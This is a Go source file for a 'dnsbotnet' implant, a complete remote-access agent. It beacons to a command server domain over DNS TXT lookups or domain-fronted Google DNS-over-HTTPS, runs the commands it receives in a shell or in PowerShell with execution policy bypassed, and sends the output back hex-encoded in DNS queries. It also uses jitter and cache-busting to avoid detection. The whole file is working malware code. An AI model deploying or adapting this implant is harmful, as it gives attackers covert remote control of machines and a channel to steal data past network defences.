// dnsbotnet implant
package main

/*
 * implant.go
 * Connects to dnsbotnet server
 * By J. Stuart McMurray
 * Created 20180210
 * Last Modified 20180210
 */

import (
	"bytes"
	"context"
	"crypto/tls"
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"log"
	"math/rand"
	"net"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"time"
)

const (
	// MAXEXFIL is the maximum number of bytes we'll exfil per request
	MAXEXFIL = 31

	// RIDLEN is the length of the random ID
	RIDLEN = 4

	// DEFANGALPHABET
	DEFANGALPHABET = "abcdefghijklmnopqrstuvwxyz" +
		"ABCDEFGHIJKLMNOPQRSTUVWXYZ" +
		"0123456789 \n"

	// DOHPREFIX holds the prefix for a DOH request
	DOHPREFIX = "https://dns.google.com/resolve?type=TXT&name="

	// DEFFRONTPORT is the default port used for domain-fronted TLS
	// connections
	DEFFRONTPORT = "443"
)

var (
	// COUNTER is used to prevent caching
	COUNTER = uint64(0)

	/* query makes a request for the label in o, of the given type t ("t"
	or "o"), for the given ID, to the given name.  len bytes will be
	sent at once. */
	query func(o []byte, t, id, domain string, len int) []string
)

/* googleResponse holds a DoH response from google */
type googleResponse struct {
	Status  int  `json:"Number"`
	TC      bool `json:"TC"` /* Truncated */
	Answers []struct {
		Name string `json:"Name"`
		Data string `json:"Data"`
	} `json:"Answer"`
}

func main() {
	log.SetOutput(os.Stderr)

	/* Seed PRNG.  Could just use CSPRNG, but this should be fine */
	rand.Seed(time.Now().UnixNano())

	var (
		bMin = flag.Duration(
			"beacon-min",
			time.Second,
			"Minimum beacon `interval`",
		)
		bMax = flag.Duration(
			"beacon-max",
			3*time.Minute,
			"Maximum beacon `interval`",
		)
		domain = flag.String(
			"domain",
			"enmala.ga",
			"DNS domain `name`",
		)
		id = flag.String(
			"id",
			defaultID(),
			"Implant `ID`",
		)
		jitter = flag.Float64(
			"jitter",
			0.25,
			"Beacon interval jitter `fraction` between 0 and 1",
		)
		cTimeout = flag.Duration(
			"command-timeout",
			time.Minute,
			"Command execution `timeout`",
		)
		counterStart = flag.Uint64(
			"counter",
			rand.Uint64(),
			"Start cache-busting counter at `N`",
		)
		defang = flag.Bool(
			"defang",
			false,
			"Don't actually run commands, send back random "+
				"characters",
		)
		exfilLen = flag.Int(
			"exfil-max",
			31,
			"Send at most `N` payload bytes per request",
		)
		dohDomain = flag.String(
			"google-doh",
			"",
			"Use Google's DNS over HTTP, fronted to `domain`",
		)
	)
	flag.Usage = func() {
		fmt.Fprintf(
			os.Stderr,
			`Usage: %v [options]

Beacons to the given domain periodically and runs commands it gets back.

The higher the jitter, the more random the beacon interval.

Options:
`,
			os.Args[0],
		)
		flag.PrintDefaults()
	}
	flag.Parse()

	COUNTER = *counterStart

	/* Make sure jitter is in the right range */
	if 0 > *jitter || 1 < *jitter {
		fmt.Fprintf(
			os.Stderr,
			"Jitter must be between 0 and 1, inclusive.\n",
		)
		os.Exit(1)
	}

	/* Make sure we don't send too many or too few bytes at once */
	if 0 >= *exfilLen {
		fmt.Fprintf(
			os.Stderr,
			"Must send at least one byte per request "+
				"(-exfil-max)\n",
		)
		os.Exit(2)
	}
	if MAXEXFIL < *exfilLen {
		fmt.Fprintf(
			os.Stderr,
			"Cannot send more than %v bytes per request "+
				"(-exfil-max)\n",
			MAXEXFIL,
		)
		os.Exit(3)
	}

	/* Work out whether to do normal DNS or DoH */
	if "" == *dohDomain {
		query = queryDNS
	} else {
		query = queryDF(*dohDomain)
	}

	/* Print the ID we're using.  In the case of a random ID, this is not
	predictable. */
	log.Printf("ID: %v", *id)

	st := *bMin /* Sleep time */
	for {
		/* Check for tasking */
		tasking := getTasking(*id, *domain, *exfilLen)
		/* If we have it, do it and send the output back, don't sleep
		so long next time */
		if "" != tasking {
			doTasking(
				tasking,
				*id,
				*domain,
				*cTimeout,
				*defang,
				*exfilLen,
			)
			st = *bMin
		}
		/* Sleep before next beacon */
		st = addJitter(st, *jitter)
		time.Sleep(st)
		/* Sleep longer next time */
		st *= 2
		if st > *bMax {
			st = *bMax
		}
	}
}

/* defaultID tries to use the IP address of an interface as an ID.  It returns
the first non-loopback address it finds. */
func defaultID() string {
	var id string

	/* Look through all the interfaces for one we like */
	is, err := net.Interfaces()
	if nil != err {
		log.Printf("Unable to list interfaces: %v", err)
	}
	for _, i := range is {
		/* Skip docker interfaces */
		/* TODO: Unhardcode this */
		if "docker0" == i.Name {
			continue
		}
		/* Skip loopback interfaces */
		if 0 != (net.FlagLoopback & i.Flags) {
			continue
		}
		/* Get the addresses for this interface */
		as, err := i.Addrs()
		if nil != err {
			log.Printf(
				"Unable to get addresses for %v: %v",
				i.Name,
				err,
			)
			continue
		}
		/* Use the first address we find */
		if 0 == len(as) {
			continue
		}
		id = as[0].String()
	}
	/* Clean up the address a bit, to make DNS-friendly */
	parts := strings.SplitN(id, "/", 2)
	if 0 == len(parts) { /* Probably didn't find one */
		return randomID()
	}

	/* Remove all non-hex characters */
	id = strings.Map(
		func(r rune) rune {
			/* Turn all non-hex characters into hyphens */
			if !strings.ContainsRune("abcdefABCDEF0123456789", r) {
				return '-'
			}
			return r
		},
		parts[0],
	)
	/* Trim leading and trailing -'s, which can happen with IPv6
	addresses */
	return strings.Trim(id, "-")
}

/* randomID returns an ID consisting of two random numbers */
func randomID() string {
	b := make([]byte, RIDLEN)
	if _, err := rand.Read(b); nil != err {
		panic(err)
	}
	return fmt.Sprintf("%02x", b)
}

/* getTasking beacons to the domain to try to get tasking.  It returns the
empty string if there was none. */
func getTasking(id, domain string, exfilLen int) string {
	/* Try to get a text tasking */
	txts := query([]byte{'0'}, "t", id, domain, exfilLen)

	/* Make sure we got tasking */
	if 0 == len(txts) {
		return ""
	}

	/* We should only have one text record if it's a legit tasking */
	if 1 != len(txts) {
		log.Printf("Too many answers for tasking: %q", txts)
		return ""
	}

	return txts[0]
}

/* doTasking runs the tasking in a shell and returns the output over DNS.  If
defang is true and task is a number, that many random characters will be sent
instead of running a command.  exfilLen bytes will be sent at once. */
func doTasking(
	task string,
	id string,
	domain string,
	to time.Duration,
	defang bool,
	exfilLen int,
) {
	if defang {
		sendRandomChars(task, id, domain, exfilLen)
		return
	}

	/* Context which times out */
	ctx, cancel := context.WithTimeout(context.Background(), to)
	defer cancel() /* Shouldn't do much, but may clean things up */

	/* Make a shell */
	var cmd *exec.Cmd
	if "windows" == runtime.GOOS {
		cmd = exec.CommandContext(
			ctx,
			"powershell.exe",
			"-ep", "bypass",
			"-noni",
			"-nop",
			"-command", "-",
		)
	} else {
		cmd = exec.CommandContext(ctx, "/bin/sh")
	}
	setProcAttr(cmd)

	/* Hook up stdin */
	cmd.Stdin = strings.NewReader(task)

	/* Run command */
	log.Printf("Running %q", task)
	o, err := cmd.CombinedOutput()

	/* If we got an error, stick the message on the output */
	if nil != err {
		log.Printf("Error running %q: %v", task, err)
		o = append(o, []byte(err.Error())...)
	} else {
		log.Printf("Done running %q", task)
	}

	/* Make sure we have a newline */
	if !bytes.HasSuffix(o, []byte{'\n'}) {
		o = append(o, '\n')
	}

	/* Send it back in 31-byte chunks */
	query(o, "o", id, domain, exfilLen)
}

/* createQueries splits o and turns it into a slice of DNS queries which use
the implant ID id and domain domain. */
func createQueries(o []byte, t, id, domain string, exfilLen int) []string {
	var (
		start int
		end   int
		qs    []string
	)
	for start = 0; start < len(o); start += exfilLen {
		/* Work out end index */
		end = start + exfilLen
		if end > len(o) {
			end = len(o)
		}
		/* Exfil request name */
		qs = append(qs, fmt.Sprintf(
			"%02x.%v.%v.%v.%v",
			o[start:end],
			COUNTER,
			t,
			id,
			domain,
		))
		COUNTER++
	}

	return qs
}

/* queryDNS sends off the contents of b in exfilLen-size chunks */
func queryDNS(o []byte, t, id, domain string, exfilLen int) []string {
	var as []string
	for _, q := range createQueries(o, t, id, domain, exfilLen) {
		a, err := net.LookupTXT(q)
		if nil != err && !strings.HasSuffix(
			err.Error(),
			"no such host",
		) {
			log.Printf("Query error (%v): %v", q, err)
		}
		if nil != a {
			as = append(as, a...)
		}
	}
	return as
}

/* queryDF returns a function which sends bytes using dns.google.com
fronted to a given domain. */
func queryDF(
	frontDomain string,
) func([]byte, string, string, string, int) []string {
	/* Make sure our domain has a port */
	if _, _, err := net.SplitHostPort(frontDomain); nil != err {
		frontDomain = net.JoinHostPort(frontDomain, DEFFRONTPORT)
	}

	/* HTTP Client which fronts */
	client := &http.Client{
		Transport: &http.Transport{
			DialTLS: func(network, addr string) (net.Conn, error) {
				return tls.Dial("tcp", frontDomain, nil)
			},
		},
	}

	/* Function which does the real work */
	return func(o []byte, t, id, domain string, exfilLen int) []string {
		var as []string
		for _, q := range createQueries(o, t, id, domain, exfilLen) {
			a, err := domainFrontQuery(client, q)
			if nil != err {
				log.Printf("Query error (%v): %v", q, err)
			}
			if nil != a {
				as = append(as, a...)
			}
		}
		return as
	}
}

/* domainFrontQuery queries google for the domain name q using the client c */
func domainFrontQuery(c *http.Client, q string) ([]string, error) {
	/* Request the domain */
	res, err := c.Get(DOHPREFIX + q)
	if nil != err {
		return nil, err
	}

	/* Make sure we made an ok request */
	if http.StatusOK != res.StatusCode {
		return nil, fmt.Errorf("received %s", res.Status)
	}

	/* Get HTTP response body */
	var b bytes.Buffer
	n, err := b.ReadFrom(res.Body)
	defer res.Body.Close()
	if nil != err {
		return nil, err
	}
	if 0 == n {
		return nil, errors.New("empty body")
	}

	/* Unroll answer */
	var a googleResponse
	if err := json.Unmarshal(b.Bytes(), &a); nil != err {
		return nil, err
	}

	/* Make sure it worked */
	if 0 != a.Status {
		return nil, fmt.Errorf("unsuccessful, status %v", a.Status)
	}

	/* Make sure we didn't get truncated */
	if a.TC {
		return nil, errors.New("truncated answer")
	}

	var ss []string
	for _, s := range a.Answers {
		d, err := strconv.Unquote(s.Data)
		if nil != err {
			log.Printf("Unable to unmarshal %q: %v", s.Data, err)
			continue
		}
		ss = append(ss, d)
	}
	return ss, nil
}

/* sendRandomChars sends random characters to the server.  The number of
characters is controlled by putting a number in count.  exfilLen bytes will
be sent at once. */
func sendRandomChars(count, id, domain string, exfilLen int) {
	/* Try to get a number */
	n, err := strconv.Atoi(count)
	if nil != err {
		s := err.Error()
		if !strings.HasSuffix(s, "\n") {
			s += "\n"
		}
		query([]byte(s), "o", id, domain, exfilLen)
		return
	}

	/* Characters to send */
	cs := make([]byte, n)
	for i := range cs {
		cs[i] = []byte(DEFANGALPHABET)[rand.Intn(len(DEFANGALPHABET))]
	}
	if !bytes.HasSuffix(cs, []byte{'\n'}) {
		cs = append(cs, '\n')
	}

	query(cs, "o", id, domain, exfilLen)
}

/* addJitter returns d varied by j, which must be a fraction between 0 and
1. */
func addJitter(d time.Duration, j float64) time.Duration {
	return d + time.Duration(float64(d)*j*(2*rand.Float64()-1))
}
